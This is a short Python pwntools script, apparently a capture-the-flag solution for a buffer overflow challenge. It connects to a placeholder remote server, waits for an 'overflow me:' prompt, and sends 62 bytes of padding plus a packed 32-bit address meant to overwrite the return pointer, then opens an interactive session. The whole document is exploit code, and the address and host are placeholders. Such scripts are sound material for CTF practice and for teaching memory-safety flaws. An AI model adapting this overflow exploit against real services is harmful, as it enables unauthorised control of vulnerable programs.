from pwn import *

proc = remote(<ip address>, <port number>)    #connects remotely to server
proc.recvuntil(":") # the program asks "overflow me:" so it inputs after the ":"
padding = ('A' * 62).encode()   # puts in 62 characters worth of padding

# converts integer to 4-byte (32-bit) representation.
rip = p32(<flag>)   # flag

payload = padding + rip
proc.sendline(payload)

proc.interactive()
proc.close()